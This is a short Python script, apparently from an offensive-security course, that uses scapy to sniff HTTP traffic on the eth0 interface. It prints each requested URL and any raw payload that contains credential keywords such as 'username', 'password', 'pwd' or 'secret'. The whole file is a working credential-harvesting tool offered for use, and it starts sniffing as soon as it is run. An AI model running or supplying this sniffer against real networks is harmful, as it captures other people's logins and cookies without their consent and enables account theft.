#!/usr/bin/env python3
#import http

import scapy.all as scapy
from scapy.layers.http import *

#store specifies where scapy should store this sniffed information. Defaults to in-memory
#prn specifies a function to run with each packet sniffed
#filter can be udp, tcp, arp, etc. Ports with "port 21", "port 22", etc.
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    host = packet[HTTPRequest].Host
    path = packet[HTTPRequest].Path
    url = host + path
    return url

def get_login_info(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode()
        keywords = ["username", "user", "name", "password", "pass", "pwd", "pw=", "secret"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    #Sniff for HTTP POST Requests
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> ", url)
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible Username/Password >", login_info, "\n")
    #Sniff for Cookies in HTTP Responses
    #if packet.haslayer(HTTPResponse):
sniff("eth0")